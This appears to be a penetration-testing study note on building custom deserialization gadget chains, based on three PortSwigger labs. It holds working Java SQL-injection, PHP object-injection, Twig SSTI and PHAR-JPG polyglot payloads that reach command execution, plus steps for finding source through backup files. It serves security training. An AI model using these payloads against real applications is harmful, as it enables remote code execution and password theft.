# Insecure deserialization — Custom gadget chains

When no pre-built chain fits, read the application's source code (backup files, `/backup/` dir) and trace magic method calls to construct your own chain. Also covers PHAR deserialization — triggering PHP deserialization through filesystem calls without `unserialize()`.

## Quick reference
```
# PHP: find source via backup extension
GET /cgi-bin/libs/CustomTemplate.php~   -> PHP source code

# PHP custom chain structure (wakeup → constructor → __get → exec)
O:14:"CustomTemplate":2:{
  s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";
  s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}
}

# Java: deserialize object whose readObject() runs SQL query → SQLi
# id = ' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--

# PHAR: trigger deserialization via phar:// stream (no unserialize())
# 1) Create PHAR-JPG polyglot with PHP payload
# 2) Upload as avatar (passes JPG check)
# 3) GET /cgi-bin/avatar.php?avatar=phar://wiener
#    → file_exists("phar://wiener") → deserializes PHAR manifest → gadget chain fires
```

## Root cause
Application source reveals classes with dangerous magic methods. The attacker traces the call graph: `__wakeup` → constructor → property access → `__get` → `call_user_func`. By crafting a serialized object that walks this path, arbitrary code execution follows. PHAR extends this by triggering deserialization through filesystem operations rather than `unserialize()`.

## Find it
1. Site map → `/backup/` directory → Java `.java` source files.
2. Request `ClassName.php~` (tilde backup) for every PHP class referenced in errors or JS.
3. Grep source for: `__wakeup`, `__destruct`, `__get`, `__toString`, `readObject`, `call_user_func`, `exec`, `system`, `unlink`.
4. PHAR: look for `file_exists()`, `fopen()`, `file_get_contents()` on user-controlled paths.

## Technique

**Java custom chain → SQLi (Lab 1):**
1. Source at `/backup/AccessTokenUser.java` and `/backup/ProductTemplate.java`.
2. `ProductTemplate.readObject()` passes `this.id` directly into a Postgres SQL query.
3. Write Java serializer (or use Hackvertor template from PortSwigger solution):
   - Serialize `new ProductTemplate("'")` → Base64 → use as cookie → SQL error confirms injection.
   - Final payload: `' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--`
   - Cast error in response leaks admin password.
4. Log in as administrator → /admin → delete carlos.

**PHP custom chain → RCE (Lab 2):**
1. Source at `/cgi-bin/libs/CustomTemplate.php~`. Two relevant classes:
   - `CustomTemplate`: `__wakeup()` → `new Product($this->default_desc_type, $this->desc)`
   - `DefaultMap`: `__get($name)` → `call_user_func($this->callback, $name)` (fires on any undefined property access)
2. Chain: deserialize CustomTemplate → `__wakeup()` → Product constructor reads `default_desc_type` from `desc` → `desc` is a DefaultMap → `__get('default_desc_type')` → `call_user_func('exec', 'rm /home/carlos/morale.txt')`.
3. Payload:
   ```
   O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
   ```
4. Base64+URL-encode → session cookie → RCE.

**PHAR deserialization (Lab 3):**
1. Avatar upload (JPG only). `file_exists()` called on avatar path from user input.
2. Source: `/cgi-bin/Blog.php~`, `CustomTemplate.php~`. Gadget chain:
   - `CustomTemplate.template_file_path` = Blog object
   - `Blog.desc` = Twig SSTI payload
   - `file_exists()` on `CustomTemplate.template_file_path` triggers deserialization → Blog.desc evaluated as template
3. SSTI payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
4. Write PHP to create CustomTemplate+Blog objects, serialize into PHAR archive.
5. Use phar-jpg-polyglot tool to embed PHAR in valid JPG → upload as avatar (passes content check).
6. Trigger: `GET /cgi-bin/avatar.php?avatar=phar://wiener` → `file_exists("phar://wiener")` → PHAR deserialized → chain fires → SSTI → RCE.

## Payload arsenal
```
# Lab 1 — Java SQLi (Postgres error-based)
' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--

# Lab 2 — PHP custom chain
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}

# Lab 3 — PHAR trigger URL
/cgi-bin/avatar.php?avatar=phar://wiener

# Lab 3 — Twig SSTI RCE payload (in Blog.desc)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}

# Lab 3 — PHP to create PHAR
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
// serialize into PHAR, wrap in JPG polyglot
```

## Bypasses
| Obstacle | Bypass |
|---|---|
| Java: need to compile serializer | Use Burp Hackvertor extension with the template from PortSwigger solution |
| PHAR: only JPG accepted | phar-jpg-polyglot: valid JPG magic bytes + PHP payload embedded |
| No obvious chain in source | Expand search: check parent classes, traits, interfaces for magic methods |

## Exploitation walkthrough
**Java SQLi:** backup source → `readObject()` runs SQL with `this.id` → serialize with `id='` → error confirms SQLi → UNION enum → CAST(password AS numeric) → admin password in error → login → delete carlos.

**PHP custom chain:** read `.php~` → trace `__wakeup` → Product constructor → DefaultMap `__get` → `call_user_func` → set callback=exec, default_desc_type=command → Base64+URL-encode → cookie → RCE.

**PHAR:** source shows Twig template engine + gadget chain → build PHAR-JPG polyglot with Blog.desc=SSTI → upload avatar → `phar://wiener` as avatar param → file_exists triggers PHAR deserialization → SSTI RCE.

## Chaining
- Deserialization → SQLi (Java) → [SQL-injection](../../SQL-injection/) credential extraction.
- PHAR + file upload → SSTI → RCE → [SSTI](../../SSTI/) (Twig/template injection context).
- Custom PHP chain → `exec()` → OS command injection → [OS-command-injection](../../OS-command-injection/).

## Tools
- **Burp Hackvertor extension** — modify Java serialized objects without Java compiler (use provided Base64 template)
- **phar-jpg-polyglot scripts** — embed PHAR in valid JPG (search GitHub for "phar jpg polyglot")
- **PHP CLI** — craft and test custom serialized objects locally before attacking

## Labs

### Developing a custom gadget chain for Java deserialization [Expert]
`/backup/ProductTemplate.java` — `readObject()` runs SQL with `id`. Serialize ProductTemplate with SQL payload → Postgres error leaks admin password → login → delete carlos. Key insight: `readObject()` is the Java equivalent of `__wakeup` — code runs immediately on deserialization.

### Developing a custom gadget chain for PHP deserialization [Expert]
Source at `.php~` backup. Chain: `CustomTemplate.__wakeup` → Product constructor reads `desc.default_desc_type` → `DefaultMap.__get` fires → `call_user_func(callback, command)` → exec. Key insight: any property access on a DefaultMap triggers `call_user_func` with the accessed property name as argument.

### Using PHAR deserialization to deploy a custom gadget chain [Expert]
`file_exists()` on avatar path triggers PHAR stream deserialization. PHAR-JPG polyglot passes upload filter. Blog.desc = Twig SSTI payload → RCE. Key insight: PHAR deserialization doesn't require `unserialize()` — any PHP filesystem function on a `phar://` path triggers it.

## Real-world notes
- `.php~` backup files are extremely common on Apache/nginx — always check them.
- `__get` and `call_user_func` are the most powerful gadget primitives in PHP — any class that uses them is a potential chain endpoint.
- PHAR deserialization via `file_exists` has been used in real WordPress/Drupal chains.
- Java's `readObject` is application-level deserialization code — any class implementing it is a potential gadget.

## References
- https://portswigger.net/web-security/deserialization/exploiting
